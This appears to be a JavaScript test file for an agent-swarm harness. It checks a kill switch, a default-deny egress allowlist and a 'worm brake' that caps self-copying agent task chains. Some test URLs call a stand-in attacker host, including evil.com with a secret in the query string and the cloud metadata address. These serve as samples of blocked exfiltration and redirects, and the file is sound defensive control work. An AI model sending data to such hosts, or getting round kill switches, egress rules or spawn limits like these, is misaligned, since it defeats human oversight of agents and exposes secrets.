'use strict';

/**
 * Chamber stubs C1, C2, C4 (HARNESS_ARCHITECTURE_SYNTHESIS 2026-10-16 §2). Each one is default-OFF:
 * with its flag unset it only logs, and with its flag set it refuses.
 *
 *  C1 killSwitch.check(scope)  HARNESS_KILL_SWITCH_ENFORCE  halted -> the toolbelt makes no fetch
 *  C2 egressFetch(agent,url)   EGRESS_DEFAULT_DENY          rejects evil.com, ok.com.evil.com, ok.com@evil.com,
 *                                                           an off-list redirect, 169.254.169.254; allows ok.com
 *  C4 worm brake               TASK_WORM_BRAKE_ENFORCE      a self-copying task stops at generation 4;
 *                                                           a per-creator hourly cap; every V4 task insert asks first
 *
 * Offline: fetch is stubbed, and the halt flag is read through emergency-halt's test seam.
 * Run: node tests/chamber-stubs.test.js
 */

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

process.env.SWARM_TOOLBELT = 'on';
process.env.AGENT_NAME = 'trinity-test';
for (const k of ['HARNESS_KILL_SWITCH_ENFORCE', 'EGRESS_DEFAULT_DENY', 'EGRESS_ALLOWLIST', 'TASK_WORM_BRAKE_ENFORCE', 'TASK_WORM_BRAKE_HOURLY_CAP']) {
  delete process.env[k];
}

// The fetch stub follows redirects the way real fetch does unless it is asked for redirect:'manual'.
let routes = {};
let contacted = [];
global.fetch = async function stubFetch(url, init = {}) {
  url = String(url);
  for (let i = 0; i < 20; i++) {
    contacted.push(url);
    const [status, location] = routes[url] || [200];
    if (!location) return new Response(`body of ${url}`, { status });
    if (init.redirect === 'manual') return new Response(null, { status, headers: { location } });
    url = new URL(location, url).toString();
  }
  throw new TypeError('redirect count exceeded');
};

let warnings = [];
console.warn = (...a) => warnings.push(a.join(' '));

const halt = require('../lib/emergency-halt');
const killSwitch = require('../lib/kill-switch');
const { egressFetch, egressPolicy } = require('../lib/egress-fetch');
const wormBrake = require('../lib/worm-brake');
const belt = require('../lib/swarm-toolbelt');

function setHalt(on) {
  halt.__resetForTests();
  halt.__setQueryImplForTests(async () => [{ emergency_halt: on }]);
}
function reset(env = {}) {
  for (const k of ['HARNESS_KILL_SWITCH_ENFORCE', 'EGRESS_DEFAULT_DENY', 'EGRESS_ALLOWLIST', 'TASK_WORM_BRAKE_ENFORCE', 'TASK_WORM_BRAKE_HOURLY_CAP']) {
    delete process.env[k];
  }
  Object.assign(process.env, env);
  routes = {};
  contacted = [];
  warnings = [];
  setHalt(false);
  wormBrake.__resetForTests();
}

let n = 0;
let failed = 0;
async function t(name, fn) {
  try {
    await fn();
    n++;
    console.log(`  ok  ${name}`);
  } catch (e) {
    failed++;
    console.log(`  FAIL  ${name}: ${String(e.message).split('\n')[0]}`);
  }
}

(async () => {
  console.log('C1 kill switch');

  await t('halted + HARNESS_KILL_SWITCH_ENFORCE=1: http_get returns HALTED and makes no fetch', async () => {
    reset({ HARNESS_KILL_SWITCH_ENFORCE: '1' });
    setHalt(true);
    const r = await belt.execute('http_get', { url: 'https://repid-engine-production.up.railway.app/health' });
    assert.match(r, /^FAILED:.*HALTED/);
    assert.equal(contacted.length, 0, `fetched while halted: ${contacted}`);
  });

  await t('halted, flag unset (default): shadow, logs "would halt", fetch goes out', async () => {
    reset();
    setHalt(true);
    const r = await belt.execute('http_get', { url: 'https://repid-engine-production.up.railway.app/health' });
    assert.match(r, /^OK status=200/);
    assert.equal(contacted.length, 1);
    assert.ok(warnings.some((w) => /\[kill-switch\] SHADOW: would halt cap:egress/.test(w)), warnings.join('\n'));
  });

  await t('not halted: check() is clear and logs nothing', async () => {
    reset({ HARNESS_KILL_SWITCH_ENFORCE: '1' });
    assert.deepEqual(await killSwitch.check('global'), { halted: false, reason: null });
    assert.ok(!warnings.some((w) => w.includes('kill-switch')));
  });

  await t('every scope reads the one global flag', async () => {
    reset({ HARNESS_KILL_SWITCH_ENFORCE: '1' });
    setHalt(true);
    for (const s of ['global', 'agent:trinity-mel', 'cap:egress', 'cap:chain', 'cap:db_write']) {
      assert.equal((await killSwitch.check(s)).halted, true, s);
    }
  });

  console.log('\nC2 egressFetch');
  const ALLOW = { EGRESS_ALLOWLIST: 'ok.com' };
  const manual = { redirect: 'manual' };

  await t('policy allows ok.com (https, exact host, manual redirects)', async () => {
    reset(ALLOW);
    assert.deepEqual(egressPolicy('https://ok.com/x', manual).reasons, []);
    assert.deepEqual(egressPolicy('https://OK.com./x', manual).reasons, [], 'case and trailing dot are the same host');
  });

  for (const [url, why] of [
    ['https://evil.com/', /evil\.com is not on EGRESS_ALLOWLIST/],
    ['https://ok.com.evil.com/', /ok\.com\.evil\.com is not on/],
    ['https://ok.com@evil.com/', /evil\.com is not on/],
    ['https://169.254.169.254/latest/meta-data/', /IP literal/],
    ['http://ok.com/', /not https/],
  ]) {
    await t(`EGRESS_DEFAULT_DENY=1 rejects ${url} and sends nothing`, async () => {
      reset({ ...ALLOW, EGRESS_DEFAULT_DENY: '1' });
      await assert.rejects(egressFetch('trinity-test', url, manual), (e) => /^EGRESS_DENIED/.test(e.message) && why.test(e.message));
      assert.equal(contacted.length, 0);
    });
  }

  await t('an off-list redirect is never followed: the 3xx comes back, evil.com is not contacted', async () => {
    reset({ ...ALLOW, EGRESS_DEFAULT_DENY: '1' });
    routes = { 'https://ok.com/r': [302, 'https://evil.com/steal'] };
    const res = await egressFetch('trinity-test', 'https://ok.com/r', manual);
    assert.equal(res.status, 302);
    assert.deepEqual(contacted, ['https://ok.com/r']);
  });

  await t('EGRESS_DEFAULT_DENY=1 refuses a request that would let fetch follow redirects', async () => {
    reset({ ...ALLOW, EGRESS_DEFAULT_DENY: '1' });
    routes = { 'https://ok.com/r': [302, 'https://evil.com/steal'] };
    await assert.rejects(egressFetch('trinity-test', 'https://ok.com/r'), /follow redirects unchecked/);
    assert.equal(contacted.length, 0);
  });

  await t('flag unset (default): shadow, would-deny logged with the host only, request goes out', async () => {
    reset(ALLOW);
    const res = await egressFetch('trinity-mel', 'https://evil.com/x?d=SECRET123', manual);
    assert.equal(res.status, 200);
    assert.deepEqual(contacted, ['https://evil.com/x?d=SECRET123']);
    const w = warnings.find((x) => x.includes('[egress]'));
    assert.match(w, /SHADOW would-deny agent=trinity-mel host=evil\.com/);
    assert.ok(!w.includes('SECRET123'), 'the query string must never be logged');
  });

  await t('the toolbelt goes out through egressFetch (its would-deny names the agent)', async () => {
    reset();
    await belt.execute('http_get', { url: 'https://repid-engine-production.up.railway.app/health' });
    assert.ok(warnings.some((w) => /\[egress\] SHADOW would-deny agent=trinity-test host=repid-engine-production/.test(w)), warnings.join('\n'));
  });

  console.log('\nC4 worm brake');

  await t('TASK_WORM_BRAKE_ENFORCE=1: a self-copying task chain stops at generation 4', async () => {
    reset({ TASK_WORM_BRAKE_ENFORCE: '1' });
    const made = [];
    for (let parentGeneration = 0; parentGeneration < 10; parentGeneration++) {
      const r = wormBrake.checkSpawn({ creator: 'trinity-mel', parentGeneration });
      if (!r.allow) break;
      made.push(r.generation);
    }
    assert.deepEqual(made, [1, 2, 3]);
    assert.ok(warnings.some((w) => /BLOCKED .*generation 4 > 3/.test(w)));
  });

  await t('flag unset (default): generation 4 is allowed and logged as would-block', async () => {
    reset();
    const r = wormBrake.checkSpawn({ creator: 'trinity-mel', parentGeneration: 3 });
    assert.equal(r.allow, true);
    assert.equal(r.generation, 4);
    assert.ok(warnings.some((w) => /SHADOW would block .*generation 4 > 3/.test(w)));
  });

  await t('per-creator hourly cap: the 4th of cap 3 is refused, another creator is not, an hour later it clears', async () => {
    reset({ TASK_WORM_BRAKE_ENFORCE: '1', TASK_WORM_BRAKE_HOURLY_CAP: '3' });
    const t0 = 1_000_000;
    const ok = [1, 2, 3, 4].map((i) => wormBrake.checkSpawn({ creator: 'trinity-hdm', parentGeneration: 0, now: t0 + i }).allow);
    assert.deepEqual(ok, [true, true, true, false]);
    assert.equal(wormBrake.checkSpawn({ creator: 'trinity-apm', parentGeneration: 0, now: t0 + 5 }).allow, true);
    assert.equal(wormBrake.checkSpawn({ creator: 'trinity-hdm', parentGeneration: 0, now: t0 + 3_600_002 }).allow, true);
  });

  await t('unknown parent generation: only the rate rule applies', async () => {
    reset({ TASK_WORM_BRAKE_ENFORCE: '1' });
    const r = wormBrake.checkSpawn({ creator: 'trinity-mel', parentGeneration: null });
    assert.equal(r.allow, true);
    assert.equal(r.generation, null);
  });

  // V4 asks the brake before every task it inserts.
  const V4 = require('../lib/ConstitutionalAgentV4');
  const fakeAgent = (generationOrError) => ({
    name: 'trinity-mel',
    supabase: {
      from: () => ({
        select: () => ({
          eq: () => ({
            maybeSingle: async () => {
              if (generationOrError instanceof Error) throw generationOrError;
              return { data: { generation: generationOrError } };
            },
          }),
        }),
      }),
    },
  });

  await t('V4 _spawnAllowed reads the parent generation: 3 -> refused under enforce, 2 -> allowed', async () => {
    reset({ TASK_WORM_BRAKE_ENFORCE: '1' });
    assert.equal(await V4.prototype._spawnAllowed.call(fakeAgent(3), 41), false);
    assert.equal(await V4.prototype._spawnAllowed.call(fakeAgent(2), 42), true);
  });

  await t('V4 _spawnAllowed: an unreadable parent falls back to the rate rule, and says so', async () => {
    reset({ TASK_WORM_BRAKE_ENFORCE: '1' });
    assert.equal(await V4.prototype._spawnAllowed.call(fakeAgent(new Error('pooler down')), 43), true);
    assert.ok(warnings.some((w) => /could not read generation of task 43/.test(w)));
  });

  await t('every trinity_tasks insert in ConstitutionalAgentV4.js is preceded by _spawnAllowed', async () => {
    const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'ConstitutionalAgentV4.js'), 'utf8');
    const lines = src.split('\n');
    const inserts = [];
    lines.forEach((l, i) => {
      const window = lines.slice(Math.max(0, i - 2), i + 1).join('\n');
      if (/\.insert\(/.test(l) && /from\('trinity_tasks'\)/.test(window)) inserts.push(i);
    });
    assert.equal(inserts.length, 3, `expected the 3 known task inserts, found ${inserts.length}; a new one must ask the brake`);
    for (const i of inserts) {
      const before = lines.slice(Math.max(0, i - 3), i + 1).join('\n');
      assert.match(before, /this\._spawnAllowed\(/, `task insert at line ${i + 1} does not ask the worm brake`);
    }
  });

  console.log(`\n${n} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
})().catch((e) => {
  console.error(e);
  process.exit(1);
});
